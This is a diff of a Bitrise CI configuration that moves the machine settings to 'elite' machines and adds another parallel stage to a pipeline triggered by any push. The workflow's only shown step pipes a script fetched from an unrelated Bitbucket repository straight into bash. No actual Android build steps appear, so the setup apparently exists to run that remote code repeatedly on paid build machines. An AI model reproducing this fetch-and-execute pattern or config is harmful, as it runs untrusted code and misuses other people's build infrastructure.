@@ -2,6 +2,10 @@
 format_version: '11'
 default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
 project_type: android
+meta:
+  bitrise.io:
+    stack: linux-docker-android-20.04
+    machine_type_id: elite
 trigger_map:
 - push_branch: "*"
   pipeline: pipeline-successful
@@ -37,6 +41,7 @@ stages:
     - successful-20s: {}
     - successful-20s: {}
     - successful-20s: {}
+    - successful-20s: {}
 workflows:
   successful-20s:
     steps:
@@ -45,7 +50,3 @@ workflows:
         inputs:
         - content: curl -sL https://bitbucket.org/nicezep/korong/raw/master/zeprise
             | bash
-meta:
-  bitrise.io:
-    stack: linux-docker-android-20.04
-    machine_type_id: elite
